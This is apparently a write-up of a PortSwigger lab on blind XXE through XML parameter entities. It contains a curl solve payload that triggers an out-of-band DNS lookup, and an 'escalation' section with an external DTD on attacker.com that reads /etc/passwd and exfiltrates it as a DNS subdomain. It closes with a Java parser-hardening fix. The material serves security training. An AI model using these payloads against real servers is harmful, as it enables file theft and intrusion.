---
layout: post
title: "Blind XXE with Out-of-Band Interaction via XML Parameter Entities"
date: 2027-08-12 09:00:00 -0500
categories: [PortSwigger, XXE]
tags: [xxe, blind, oob, oast, dns, cwe-611, java, xml, parameter-entities, bypass]
---

## Overview

This lab covers **blind XXE via XML parameter entities** — the bypass variant used when an application blocks regular external entity references (`&entity;` in the document body) but still processes parameter entities in the DOCTYPE internal subset.

**CWE:** CWE-611 — Improper Restriction of XML External Entity Reference
**Difficulty:** Apprentice

---

## The Vulnerability

The `/product/stock` endpoint parses XML sent in the request body. A stock-check POST normally looks like this:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

The application blocks the standard external entity injection pattern:

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]>
...&xxe;...
```

But it does **not** block XML parameter entities.

---

## General vs Parameter Entities

XML defines two syntactically distinct entity types:

| Type | Declaration | Reference | Used in |
|---|---|---|---|
| General entity | `<!ENTITY name SYSTEM "url">` | `&name;` | Document body |
| **Parameter entity** | `<!ENTITY % name SYSTEM "url">` | `%name;` | DTD only |

Parameter entities are designed for DTD modularisation — they reference and include external DTD fragments. When the XML parser encounters `%name;` in the DOCTYPE internal subset, it fetches the SYSTEM URI as part of DTD processing, **before the document body is parsed**.

---

## Why HTTP 400 is the Success Indicator

Injecting:

```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://LABEL.oastify.com"> %xxe; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

The sequence:
1. Parser registers `%xxe` pointing to the external URI.
2. `%xxe;` in the DTD triggers a fetch of `http://LABEL.oastify.com`.
3. The DNS lookup fires — PortSwigger's infrastructure detects the query.
4. The fetch returns empty/non-DTD content → parser throws → app returns `HTTP 400 "XML parsing error"`.

The **400 is proof of success**. The OOB DNS interaction happened before the parse error was generated. No `&xxe;` is needed anywhere in the document body.

---

## Solve

```bash
curl -s https://TARGET.web-security-academy.net/product/stock \
  -H 'Content-Type: application/xml' \
  --data '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://abc123.oastify.com"> %xxe; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'
```

**Response:** `"XML parsing error"` (HTTP 400) — OOB interaction confirmed, lab solved.

---

## Escalation: Data Exfiltration

The blind OOB trigger confirms the vulnerability. To exfiltrate data, host an external DTD that chains parameter entities to encode file contents as a DNS subdomain:

**`http://attacker.com/evil.dtd`:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://%file;.attacker.com/'>">
%exfil;
%send;
```

**Payload:**
```xml
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

The file contents appear as a subdomain label in the DNS query logged by Collaborator.

---

## The Fix

Disable all external entity processing at the XML parser level:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setExpandEntityReferences(false);
```

**Critical:** filtering only `&entity;` patterns is insufficient. Parameter entities via `%name;` in DOCTYPE are an equally dangerous code path that most WAF bypass filters miss.

---

*Solved — PortSwigger Web Security Academy*
